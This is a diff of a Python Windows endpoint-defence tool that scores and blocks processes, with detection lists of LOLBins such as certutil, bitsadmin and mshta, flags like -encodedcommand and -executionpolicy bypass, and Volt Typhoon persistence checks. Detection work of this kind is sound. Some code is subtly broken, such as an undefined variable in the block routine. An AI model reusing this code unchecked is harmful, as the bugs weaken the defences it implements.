-                analysis_results['analyses']['pattern_matched'] = True
-                return analysis_results
-            # 5. Sandbox testing for high-risk processes
-            initial_risk = process_info.get('risk_level', 1.0)
-            volt_risk = volt_analysis.get('volt_typhoon_risk_score', 0.0)
-            
-            if initial_risk > 5.0 or tree_analysis.get('risk_score', 0) > 5.0 or volt_risk > 3.0:
-                sandbox_result = await self._sandbox_test(process_info)
-                analysis_results['analyses']['sandbox'] = sandbox_result
-            else:
-                analysis_results['analyses']['sandbox'] = {'skipped': True, 'reason': 'Low initial risk'}
-                
-            # 6. Calculate final risk score
-            final_risk = self._calculate_final_risk(analysis_results['analyses'])
-            analysis_results['final_risk_score'] = final_risk
-            
         except Exception as e:
-            self.logger.error(f"Error during analysis: {e}")
+            self.logger.error(f"Process analysis error: {str(e)}", exc_info=True)
             analysis_results['error'] = str(e)
-            analysis_results['final_risk_score'] = 10.0  # Assume high risk on error
-            
+            analysis_results['final_risk_score'] = 8.0  # Conservative on error
+
         analysis_results['analysis_time'] = time.time() - analysis_start
         return analysis_results
+    
+    def _detect_lolbin_chaining(self, command_line):
+        """Detect multiple LOLBins being chained together"""
+        lolbin_count = 0
+        common_lolbins = [
+            'powershell.exe', 'cmd.exe', 'certutil.exe', 
+            'rundll32.exe', 'bitsadmin.exe', 'mshta.exe'
+        ]
         
+        for lolbin in common_lolbins:
+            if lolbin in command_line:
+                lolbin_count += 1
+                if lolbin_count >= 2:
+                    return True
+        return False 
+    def _calculate_final_risk(self, analyses):
+        """Enhanced risk calculation with LOLBin awareness"""
+        weights = {
+            'lolbin': 0.4,
+            'process_tree': 0.2,
+            'ml_prediction': 0.2,
+            'behavioral': 0.1,
+            'sandbox': 0.1
+        }
+        
+        total_score = 0.0
+        total_weight = 0.0
+        
+        # LOLBin scoring
+        lolbin_analysis = analyses.get('lolbin', {})
+        if lolbin_analysis and lolbin_analysis.get('detected'):
+                severity = analyses['lolbin'].get('severity', 'medium')
+                score = {
+                    'critical': 10.0,
+                    'high': 7.5,
+                    'medium': 5.0
+                }.get(severity, 5.0)
+                total_score += score * weights['lolbin']
+                total_weight += weights['lolbin']
+            
+        # Process tree scoring
+        if 'process_tree' in analyses and 'risk_score' in analyses['process_tree']:
+            total_score += analyses['process_tree']['risk_score'] * weights['process_tree']
+            total_weight += weights['process_tree']
+        
+        # ML prediction scoring
+        if 'ml_prediction' in analyses and 'risk_score' in analyses['ml_prediction']:
+            total_score += analyses['ml_prediction']['risk_score'] * weights['ml_prediction']
+            total_weight += weights['ml_prediction']
+        
+        # Behavioral analysis scoring
+        if 'behavioral' in analyses:
+            threat_level = analyses['behavioral'].get('threat_level', 0)
+            behavioral_score = {
+                2: 8.0,  # Malicious
+                1: 4.0,  # Suspicious
+                0: 1.0   # Clean
+            }.get(threat_level, 1.0)
+            total_score += behavioral_score * weights['behavioral']
+            total_weight += weights['behavioral']
+        
+        # Sandbox scoring
+        if ('sandbox' in analyses and 
+            not analyses['sandbox'].get('skipped') and 
+            'risk_score' in analyses['sandbox']):
+            total_score += analyses['sandbox']['risk_score'] * weights['sandbox']
+            total_weight += weights['sandbox']
+        
+        # Calculate weighted average
+        final_score = total_score / total_weight if total_weight > 0 else 5.0
+        
+        # Apply LOLBin chaining penalty if detected
+        if analyses.get('lolbin_chaining'):
+            final_score = min(final_score + 2.0, 10.0)
+        
+        return min(final_score, 10.0)
+    
+    
     async def _sandbox_test(self, process_info):
-        """Test process in sandbox environment"""
-        self.logger.info(f"Starting sandbox test for {process_info['name']}")
-        
+        """Asynchronous sandbox testing with VM pool"""
         try:
-            # Create sandbox VM
-            vm_name = self.vm_manager.create_sandbox_vm()
+            loop = asyncio.get_running_loop()
+            
+            # Get available VM from pool
+            vm_name = await loop.run_in_executor(
+                self.io_thread_pool,
+                self.vm_manager.get_available_vm
+            )
+            
             if not vm_name:
-                return {'error': 'Failed to create sandbox VM'}
+                return {'error': 'No available VM'}
                 
-            # Prepare command for testing
-            test_command = self._prepare_sandbox_command(process_info)
+            # Prepare command in parallel
+            command = await loop.run_in_executor(
+                self.cpu_thread_pool,
+                self._prepare_sandbox_command,
+                process_info
+            )
             
             # Execute in sandbox
-            execution_result = self.vm_manager.execute_in_vm(vm_name, test_command, timeout=30)
+            execution_result = await loop.run_in_executor(
+                self.io_thread_pool,
+                self.vm_manager.execute_in_vm,
+                vm_name,
+                command,
+                30
+            )
             
             # Analyze results
-            sandbox_analysis = self._analyze_sandbox_results(execution_result)
-            
-            # Cleanup
-            self.vm_manager.cleanup_vm(vm_name)
+            sandbox_analysis = await loop.run_in_executor(
+                self.cpu_thread_pool,
+                self._analyze_sandbox_results,
+                execution_result
+            )
             
             return sandbox_analysis
-            
         except Exception as e:
             self.logger.error(f"Sandbox testing error: {e}")
             return {'error': str(e), 'risk_assessment': 'HIGH'}
-            
+        finally:
+            if vm_name:
+                await loop.run_in_executor(
+                    self.io_thread_pool,
+                    self.vm_manager.release_vm,
+                    vm_name
+                )
+                
     def _prepare_sandbox_command(self, process_info):
-        """Prepare command for sandbox execution"""
+        """Prepare command for sandbox execution with Volt Typhoon focus"""
         name = process_info['name'].lower()
         cmdline = process_info.get('cmdline', '')
         
-        if 'powershell' in name:
-            # For PowerShell, create a monitored execution
-            return f"""
-            # Create baseline file states
-            $baseline = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
-            
-            # Execute the command with monitoring
-            try {{
-                {cmdline}
-            }} catch {{
-                Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
-            }}
-            
-            # Check for file system changes
-            $postExec = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
-            $changeRatio = if ($baseline.Sum -gt 0) {{ ($postExec.Sum - $baseline.Sum) / $baseline.Sum }} else {{ 0 }}
-            
-            Write-Output "BASELINE_SIZE: $($baseline.Sum)"
-            Write-Output "POST_EXEC_SIZE: $($postExec.Sum)"
-            Write-Output "CHANGE_RATIO: $changeRatio"
-            
-            # Check for network activity
-            $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object {{ $_.State -eq 'Established' }}
-            Write-Output "NETWORK_CONNECTIONS: $($connections.Count)"
-            
-            # Check for new processes
-            $processes = Get-Process | Where-Object {{ $_.StartTime -gt (Get-Date).AddMinutes(-1) }}
-            Write-Output "NEW_PROCESSES: $($processes.Count)"
-            """
+        monitoring_script = f"""
+        # Volt Typhoon specific monitoring
+        $startTime = Get-Date
         
-        elif 'cmd' in name:
-            return f"""
-            echo BASELINE_CHECK
-            dir C:\\temp /s > baseline.txt 2>nul
-            
-            REM Execute the command
+        # Baseline system state
+        $baselineServices = Get-Service | Measure-Object
+        $baselineTasks = Get-ScheduledTask | Measure-Object
+        $baselineProcesses = Get-Process | Measure-Object
+        $baselineConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}} | Measure-Object
+        
+        Write-Output "=== BASELINE ==="
+        Write-Output "SERVICES: $($baselineServices.Count)"
+        Write-Output "TASKS: $($baselineTasks.Count)"  
+        Write-Output "PROCESSES: $($baselineProcesses.Count)"
+        Write-Output "CONNECTIONS: $($baselineConnections.Count)"
+        
+        # Execute the target command
+        Write-Output "=== EXECUTING COMMAND ==="
+        try {{
             {cmdline}
-            
-            echo POST_EXEC_CHECK
-            dir C:\\temp /s > postexec.txt 2>nul
-            
-            REM Simple file count comparison
-            for /f %%i in ('type baseline.txt 2^>nul ^| find /c /v ""') do set baseline_count=%%i
-            for /f %%i in ('type postexec.txt 2^>nul ^| find /c /v ""') do set postexec_count=%%i
-            
-            echo BASELINE_FILES: %baseline_count%
-            echo POST_EXEC_FILES: %postexec_count%
-            """
+        }} catch {{
+            Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
+        }}
         
-        else:
-            # For other executables, wrap in PowerShell monitoring
-            return f"""
-            $baseline = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
-            
-            # Execute the process
-            try {{
-                Start-Process -FilePath "{process_info['name']}" -ArgumentList "{cmdline}" -Wait -NoNewWindow -ErrorAction Stop
-            }} catch {{
-                Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
+        # Post-execution analysis
+        Write-Output "=== POST-EXECUTION ANALYSIS ==="
+        
+        # Check for new scheduled tasks (Volt Typhoon persistence)
+        $newTasks = Get-ScheduledTask | Where-Object {{$_.Date -gt $startTime}}
+        Write-Output "NEW_TASKS: $($newTasks.Count)"
+        if ($newTasks.Count -gt 0) {{
+            $newTasks | ForEach-Object {{ Write-Output "TASK: $($_.TaskName) - $($_.TaskPath)" }}
+        }}
+        
+        # Check for service changes (Volt Typhoon persistence)
+        $currentServices = Get-Service | Measure-Object
+        Write-Output "SERVICE_CHANGES: $(($currentServices.Count - $baselineServices.Count))"
+        
+        # Check for new network connections (Volt Typhoon C2)
+        $currentConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}}
+        $newConnections = $currentConnections | Where-Object {{$_.CreationTime -gt $startTime}}
+        Write-Output "NEW_CONNECTIONS: $($newConnections.Count)"
+        if ($newConnections.Count -gt 0) {{
+            $newConnections | ForEach-Object {{ 
+                Write-Output "CONNECTION: $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"
             }}
-            
-            $postExec = Get-ChildItem C:\\temp -Recurse -ErrorAction SilentlyContinue | Measure-Object Length -Sum
-            Write-Output "BASELINE_SIZE: $($baseline.Sum)"
-            Write-Output "POST_EXEC_SIZE: $($postExec.Sum)"
-            """
-            
+        }}
+        
+        # Check for registry modifications (Volt Typhoon persistence)
+        $runKeys = @(
+            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
+            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
+            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
+            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
+        )
+        
+        Write-Output "=== REGISTRY PERSISTENCE CHECK ==="
+        foreach ($key in $runKeys) {{
+            try {{
+                $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
+                if ($entries) {{
+                    $entries.PSObject.Properties | Where-Object {{$_.Name -notmatch 'PS'}} | ForEach-Object {{
+                        Write-Output "REG_ENTRY: $key\\$($_.Name) = $($_.Value)"
+                    }}
+                }}
+            }} catch {{
+                # Key doesn't exist or no access
+            }}
+        }}
+        
+        # Check for netsh proxy configuration (Volt Typhoon tunneling)
+        Write-Output "=== PROXY CONFIGURATION ==="
+        try {{
+            $proxyConfig = netsh winhttp show proxy
+            Write-Output "PROXY_CONFIG: $proxyConfig"
+        }} catch {{
+            Write-Output "PROXY_CONFIG: Unable to retrieve"
+        }}
+        
+        Write-Output "=== ANALYSIS COMPLETE ==="
+        """
+        
+        return monitoring_script
+    async def _run_sandbox_analysis(self, process_info, lolbin_result, ml_analysis):
+        """Conditionally run sandbox analysis based on risk factors"""
+        # Skip sandbox for high-severity LOLBins
+        if lolbin_result and lolbin_result.get('severity') == 'high':
+            return {
+                'skipped': True, 
+                'reason': 'high_severity_lolbin'
+            }
+        
+        # Get behavioral threat level from ml_analysis
+        threat_level = ml_analysis.get('threat_level', 0)
+        
+        # Run sandbox for medium/high risk processes
+        if ml_analysis.get('risk_score', 0) > 5.0 or threat_level >= 2:
+            return await self._sandbox_test(process_info)
+        
+        return {
+            'skipped': True, 
+            'reason': 'low_initial_risk'
+        }
+        
     def _analyze_sandbox_results(self, execution_result):
-        """Analyze sandbox execution results"""
+        """Analyze sandbox execution results with Volt Typhoon focus"""
         if not execution_result.get('success', False):
             return {
                 'risk_level': 'HIGH',
@@ -647,12 +1254,12 @@ class SecurityGateway:
         except (ValueError, TypeError):
             pass
                 
-        # Check for network activity
+        # Check for network activity (Volt Typhoon C2)
         try:
-            connections = int(metrics.get('NETWORK_CONNECTIONS', 0))
-            if connections > 5:  # More than 5 network connections
+            connections = int(metrics.get('NEW_CONNECTIONS', 0))
+            if connections > 0:  # Any new connections are suspicious
                 risk_score += 2.0
-                risk_factors.append(f'High network activity: {connections} connections')
+                risk_factors.append(f'New network connections: {connections}')
         except (ValueError, TypeError):
             pass
             
@@ -669,6 +1276,15 @@ class SecurityGateway:
         if 'EXECUTION_ERROR' in output:
             risk_score += 1.0
             risk_factors.append('Command execution errors detected')
+            
+        # Check for Volt Typhoon specific indicators
+        if 'NEW_TASKS' in metrics and int(metrics['NEW_TASKS']) > 0:
+            risk_score += 3.0
+            risk_factors.append('New scheduled tasks created - possible persistence')
+            
+        if 'PROXY_CONFIG' in metrics and 'proxy' in metrics['PROXY_CONFIG'].lower():
+            risk_score += 2.0
+            risk_factors.append('Proxy configuration modified - possible tunneling')
             
         # Determine risk level
         if risk_score >= 6.0:
@@ -688,64 +1304,17 @@ class SecurityGateway:
             'execution_time': execution_result.get('execution_time', 0)
         }
         
-    def _calculate_final_risk(self, analyses):
-        """Calculate final risk score from all analyses"""
-        weights = {
-            'process_tree': 0.25,
-            'ml_prediction': 0.25,
-            'volt_typhoon': 0.25,
-            'sandbox': 0.25
-        }
-        
-        total_score = 0.0
-        total_weight = 0.0
-        
-        # Process tree analysis
-        if 'process_tree' in analyses and 'risk_score' in analyses['process_tree']:
-            score = analyses['process_tree']['risk_score']
-            total_score += score * weights['process_tree']
-            total_weight += weights['process_tree']
-            
-        # ML prediction
-        if 'ml_prediction' in analyses and 'risk_score' in analyses['ml_prediction']:
-            score = analyses['ml_prediction']['risk_score']
-            total_score += score * weights['ml_prediction']
-            total_weight += weights['ml_prediction']
-            
-        # Volt Typhoon analysis
-        if 'volt_typhoon' in analyses and 'volt_typhoon_risk_score' in analyses['volt_typhoon']:
-            score = analyses['volt_typhoon']['volt_typhoon_risk_score']
-            total_score += score * weights['volt_typhoon']
-            total_weight += weights['volt_typhoon']
-            
-        # Sandbox analysis
-        if 'sandbox' in analyses and 'risk_score' in analyses['sandbox']:
-            score = analyses['sandbox']['risk_score']
-            total_score += score * weights['sandbox']
-            total_weight += weights['sandbox']
-        elif 'sandbox' in analyses and analyses['sandbox'].get('skipped'):
-            # If sandbox was skipped, redistribute weight to other analyses
-            if total_weight > 0:
-                # Redistribute sandbox weight proportionally
-                redistribution_factor = (1 + weights['sandbox']) / total_weight if total_weight > 0 else 1
-                total_score *= redistribution_factor
-                total_weight = 1.0
-                
-        final_score = total_score / total_weight if total_weight > 0 else 5.0
-        return min(final_score, 10.0)
+    
         
     async def _make_decision(self, process_info, analysis_result):
         """Make final decision on process execution"""
         risk_score = analysis_result.get('final_risk_score', 5.0)
         pid = process_info['pid']
         process_name = process_info['name']
+        cmdline = process_info.get('cmdline', '')
 
-        # --- PowerShell Admin Exception ---
-        if process_name.lower() == "powershell.exe":
-            self.logger.info(f"EXCEPTION: Allowing PowerShell.exe (PID: {pid}) for admin/testing purposes.")
-            decision = 'ALLOW'
-            action = self._allow_process
-        elif risk_score < self.risk_thresholds['allow']:
+        # Remove PowerShell exception - all processes treated equally
+        if risk_score < self.risk_thresholds['allow']:
             decision = 'ALLOW'
             action = self._allow_process
         elif risk_score < self.risk_thresholds['monitor']:
@@ -762,6 +1331,7 @@ class SecurityGateway:
             'timestamp': datetime.now().isoformat(),
             'process': process_name,
             'pid': pid,
+            'cmdline': cmdline[:500],  # Truncate long command lines
             'risk_score': risk_score,
             'analysis_result': analysis_result,
             'decision': decision
@@ -783,191 +1353,225 @@ class SecurityGateway:
         
     async def _allow_process(self, process_info, analysis_result):
         """Allow process to continue normally"""
-        self.logger.info(f"Allowing process {process_info['name']} (PID: {process_info['pid']})")
-        # Process continues normally, no action needed
-        
+        pid = process_info['pid']
+        try:
+            # Already unfrozen in finally block of _handle_intercepted_process
+            self.logger.info(f"Allowed process {pid} to continue")
+        except Exception as e:
+            self.logger.error(f"Error allowing process {pid}: {e}")
+                    
     async def _monitor_process(self, process_info, analysis_result):
         """Monitor process with enhanced logging"""
         pid = process_info['pid']
         self.logger.info(f"Enhanced monitoring for process {process_info['name']} (PID: {pid})")
-        
-        # Start enhanced monitoring in background
-        asyncio.create_task(self._enhanced_monitoring(pid))
-        
+        asyncio.create_task(self._enhanced_monitoring(pid))       
     async def _quarantine_process(self, process_info, analysis_result):
-        """Quarantine process (suspend and isolate)"""
+        """Quarantine process (keep frozen and isolate)"""
         pid = process_info['pid']
         self.logger.warning(f"Quarantining process {process_info['name']} (PID: {pid})")
-        
-        try:
-            import psutil
-            proc = psutil.Process(pid)
-            proc.suspend()
-            
-            # Log quarantine action
-            self.logger.info(f"Process {pid} suspended successfully")
-            
-        except psutil.NoSuchProcess:
-            self.logger.info(f"Process {pid} already terminated")
-        except Exception as e:
-            self.logger.error(f"Failed to quarantine process {pid}: {e}")
+        self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
             
     async def _block_process(self, process_info, analysis_result):
         """Block/terminate process immediately"""
         pid = process_info['pid']
-        self.logger.error(f"BLOCKING process {process_info['name']} (PID: {pid}) - HIGH RISK DETECTED")
+        name = process_info['name'].lower()
         
+        # Critical processes to NEVER kill
+        CRITICAL_PROCS = {
+            "lsass.exe", "csrss.exe", "wininit.exe", "smss.exe", 
+            "services.exe", "system", "svchost.exe"
+        }
+        
+        if name in CRITICAL_PROCS:
+            self.logger.critical(f"Blocking aborted for critical process: {name}")
+            return
+        if analysis_result.get('immediate_block'):
+            # Skip forensic collection for critical blocks
+            self._terminate_process_tree(pid)
+            self._add_to_blocklist(name, cmdline)
+            self.logger.critical(f"Immediate block: {name} (PID: {pid})")
+            return    
         try:
-            import psutil
-            proc = psutil.Process(pid)
-            proc.terminate()
             
-            # Wait for termination
-            try:
-                proc.wait(timeout=5)
-            except psutil.TimeoutExpired:
-                proc.kill()  # Force kill if terminate doesn't work
-                
-            self.logger.info(f"Process {pid} terminated successfully")
+            # Collect forensic data
+            forensic_data = await asyncio.get_running_loop().run_in_executor(
+                self.cpu_thread_pool,
+                self._collect_forensic_data,
+                pid,
+                analysis_result
+            )
             
-            # Create system snapshot for potential rollback
-            await self._create_emergency_snapshot()
+            # Terminate process tree
+            await asyncio.get_running_loop().run_in_executor(
+                self.io_thread_pool,
+                self._terminate_process_tree,
+                pid
+            )
             
+            # Update blocklist
+            self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
+            
+            # Create snapshot
+            asyncio.create_task(self._create_emergency_snapshot())
+            
+            self.logger.critical(
+                f"Blocked malicious process {process_info['name']} (PID: {pid}) - " 
+                f"Reason: {analysis_result.get('detected_patterns', 'High risk activity')}"
+            )
         except psutil.NoSuchProcess:
             self.logger.info(f"Process {pid} already terminated")
         except Exception as e:
-            self.logger.error(f"Failed to block process {pid}: {e}")
+            self.logger.error(f"Blocking failed: {e}")
+            
+    def _collect_forensic_data(self, pid, analysis_result):
+        """Collect forensic evidence before termination"""
+        try:
+            proc = psutil.Process(pid)
+            return {
+                'timestamp': datetime.now().isoformat(),
+                'process': {
+                    'name': proc.name(),
+                    'pid': pid,
+                    'ppid': proc.ppid(),
+                    'cmdline': proc.cmdline(),
+                    'create_time': proc.create_time()
+                },
+                'connections': [{
+                    'fd': conn.fd,
+                    'family': conn.family,
+                    'type': conn.type,
+                    'laddr': f"{conn.laddr[0]}:{conn.laddr[1]}" if conn.laddr else None,
+                    'raddr': f"{conn.raddr[0]}:{conn.raddr[1]}" if conn.raddr else None,
+                    'status': conn.status
+                } for conn in proc.net_connections()],
+                'open_files': [f.path for f in proc.open_files()],
+                'threads': len(proc.threads()),
+                'analysis_result': analysis_result
+            }
+        except Exception:
+            return {'error': 'Failed to collect forensic data'}
+    def _sync_freeze_process(self, pid):
+        """Synchronous process freezing using debug API"""
+        if not psutil.pid_exists(pid):
+            return True
+        if kernel32.DebugActiveProcess(pid):
+            self.logger.info(f"Froze process {pid}")
+            return True
+        else:
+            error = ctypes.GetLastError()
+            self.logger.error(f"Failed to freeze process {pid}: error {error}")
+            return False    
+    async def _freeze_process(self, pid):
+        """Freeze process using debug API"""
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(
+            self.io_thread_pool,
+            self._sync_freeze_process,
+            pid
+        )   
+    async def _unfreeze_process(self, pid):
+        """Unfreeze process by detaching debugger"""
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(
+            self.io_thread_pool,
+            self._sync_unfreeze_process,
+            pid
+        ) 
+    def _sync_unfreeze_process(self, pid):
+        if not psutil.pid_exists(pid):
+            return True
+        if kernel32.DebugActiveProcessStop(pid):
+            self.logger.info(f"Unfrozen process {pid}")
+            return True
+        else:
+            error = ctypes.GetLastError()
+            self.logger.error(f"Failed to unfreeze process {pid}: error {error}")
+            return False
+            
+    def _terminate_process_tree(self, pid):
+        """Terminate entire process tree"""
+        try:
+            parent = psutil.Process(pid)
+            for child in parent.children(recursive=True):
+                try:
+                    child.kill()
+                except psutil.NoSuchProcess:
+                    pass
+            parent.kill()
+        except psutil.NoSuchProcess:
+            pass
+                
+    def _add_to_blocklist(self, process_name, cmdline):
+        """Add process signature to runtime blocklist"""
+        signature = {
+            'name': process_name.lower(),
+            'cmdline_patterns': self._extract_suspicious_patterns(cmdline),
+            'timestamp': time.time()
+        }
+        self.runtime_blocklist.append(signature)
+        self.logger.info(f"Added to blocklist: {signature}")
+
+    def _extract_suspicious_patterns(self, cmdline):
+        """Extract unique patterns from command line"""
+        patterns = []
+        cmd_lower = cmdline.lower() if cmdline else ''
+        
+        # Check for encoded commands
+        if re.search(r'[A-Za-z0-9+/]{30,}={0,2}', cmd_lower):
+            patterns.append('base64_encoded')
+            
+        # Check for suspicious parameters
+        suspicious_params = [
+            '-encodedcommand', '-windowstyle hidden', 
+            '-executionpolicy bypass', '/c', '/s', '/q'
+        ]
+        patterns.extend(p for p in suspicious_params if p in cmd_lower)
+        
+        # Check for LOLBins
+        lolbins = self.volt_detector.get_extended_lolbins()
+        patterns.extend(bin for bin in lolbins if bin in cmd_lower)
+        
+        return list(set(patterns))  # Deduplicate
             
     async def _enhanced_monitoring(self, pid):
         """Enhanced monitoring for suspicious processes"""
         try:
-            import psutil
             proc = psutil.Process(pid)
-            
-            monitoring_duration = 300  # 5 minutes
-            check_interval = 5  # 5 seconds
-            
-            for _ in range(monitoring_duration // check_interval):
+            for _ in range(60):  # Monitor for 5 minutes (5s intervals)
                 if not proc.is_running():
                     break
-                    
-                # Monitor file operations
-                try:
-                    open_files = proc.open_files()
-                    if len(open_files) > 50:  # Unusually high file handle count
-                                                self.logger.warning(f"Process {pid} has an unusually high number of open files: {len(open_files)}")
-                except Exception as e:
-                    self.logger.error(f"Error monitoring open files for process {pid}: {e}")
-
-                # Monitor network connections
-                try:
-                    connections = proc.connections()
-                    if len(connections) > 10:  # Unusually high number of network connections
-                        self.logger.warning(f"Process {pid} has an unusually high number of network connections: {len(connections)}")
-                except Exception as e:
-                    self.logger.error(f"Error monitoring network connections for process {pid}: {e}")
-
-                await asyncio.sleep(check_interval)
-
+                await asyncio.sleep(5)
         except psutil.NoSuchProcess:
-            self.logger.info(f"Process {pid} no longer exists during enhanced monitoring")
+            pass
         except Exception as e:
-            self.logger.error(f"Error during enhanced monitoring of process {pid}: {e}")
+            self.logger.error(f"Monitoring error: {e}")
 
     async def _create_emergency_snapshot(self):
         """Create a system snapshot for potential rollback"""
-        self.logger.info("Creating emergency system snapshot...")
-        # Implementation for creating a system snapshot goes here
-        # This could involve using a VM snapshot, backup software, etc.
-        await asyncio.sleep(1)  # Simulate snapshot creation delay
-        self.logger.info("Emergency system snapshot created successfully")
-
+        try:
+            loop = asyncio.get_running_loop()
+            await loop.run_in_executor(
+                self.io_thread_pool,
+                self.vm_manager.create_emergency_snapshot
+            )
+            self.logger.info("Emergency system snapshot created")
+        except Exception as e:
+            self.logger.error(f"Snapshot failed: {e}")
     def _log_decision(self, decision_data):
-        """Log decision data to a CSV file for readability and ML analysis"""
-        # Human-readable log
-        log_file = "decision_log.csv"
-        fieldnames = [
-            "timestamp", "process", "pid", "risk_score", "decision", "action_successful"
-        ]
-        write_header = not os.path.exists(log_file)
+        """Log decision data to CSV"""
         try:
-            with open(log_file, "a", newline='', encoding="utf-8") as f:
-                writer = csv.DictWriter(f, fieldnames=fieldnames)
-                if write_header:
-                    writer.writeheader()
-                row = {k: decision_data.get(k, "") for k in fieldnames}
-                writer.writerow(row)
+            with open('decision_log.csv', 'a', newline='', encoding='utf-8') as f:
+                writer = csv.writer(f)
+                writer.writerow([
+                    decision_data['timestamp'],
+                    decision_data['process'],
+                    decision_data['pid'],
+                    decision_data['risk_score'],
+                    decision_data['decision']
+                ])
         except Exception as e:
-            self.logger.error(f"Failed to log decision (CSV): {e}")
-
-        # ML-friendly log (flattened features)
-        ml_log_file = "ml_decision_log.csv"
-        ml_fields = [
-            "timestamp", "process", "pid", "risk_score", "decision"
-        ]
-        # Add more fields as needed from your analysis_result['analyses'] or features
-        analysis = decision_data.get("analysis_result", {})
-        # Example: flatten volt_typhoon risk and ML risk if present
-        if "analyses" in analysis:
-            ml_fields += [
-                "volt_typhoon_risk_score",
-                "ml_risk_score"
-            ]
-            volt = analysis["analyses"].get("volt_typhoon", {})
-            ml = analysis["analyses"].get("ml_prediction", {})
-            ml_row = {
-                "timestamp": decision_data.get("timestamp", ""),
-                "process": decision_data.get("process", ""),
-                "pid": decision_data.get("pid", ""),
-                "risk_score": decision_data.get("risk_score", ""),
-                "decision": decision_data.get("decision", ""),
-                "volt_typhoon_risk_score": volt.get("volt_typhoon_risk_score", ""),
-                "ml_risk_score": ml.get("risk_score", "")
-            }
-        else:
-            ml_row = {k: decision_data.get(k, "") for k in ml_fields}
-
-        write_ml_header = not os.path.exists(ml_log_file)
-        try:
-            with open(ml_log_file, "a", newline='', encoding="utf-8") as f:
-                writer = csv.DictWriter(f, fieldnames=ml_fields)
-                if write_ml_header:
-                    writer.writeheader()
-                writer.writerow(ml_row)
-        except Exception as e:
-            self.logger.error(f"Failed to log ML decision (CSV): {e}")
-
-
-class ProcessInterceptor:
-    def __init__(self):
-        self.process_queue = queue.Queue()
-        self._seen = set()
-        self.running = False
-
-    def start_interception(self):
-        self.running = True
-        threading.Thread(target=self._poll_processes, daemon=True).start()
-
-    def _poll_processes(self):
-        while self.running:
-            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                if proc.info['pid'] not in self._seen:
-                    self._seen.add(proc.info['pid'])
-                    cmdline = proc.info.get('cmdline')
-                    if not cmdline:
-                        cmdline = []
-                    self.process_queue.put({
-                        'name': proc.info['name'],
-                        'pid': proc.info['pid'],
-                        'cmdline': ' '.join(cmdline)
-                    })
-            time.sleep(0.5)  # Poll every 0.5 seconds for faster response
-
+            self.logger.error(f"Logging failed: {e}")
 if __name__ == "__main__":
-    import asyncio
-    gateway = SecurityGateway()
-    try:
-        asyncio.run(gateway.start_protection())
-    except KeyboardInterrupt:
-        print("Security Gateway stopped by user.")
-
+    asyncio.run(SecurityGateway().start_protection())
+    
+    
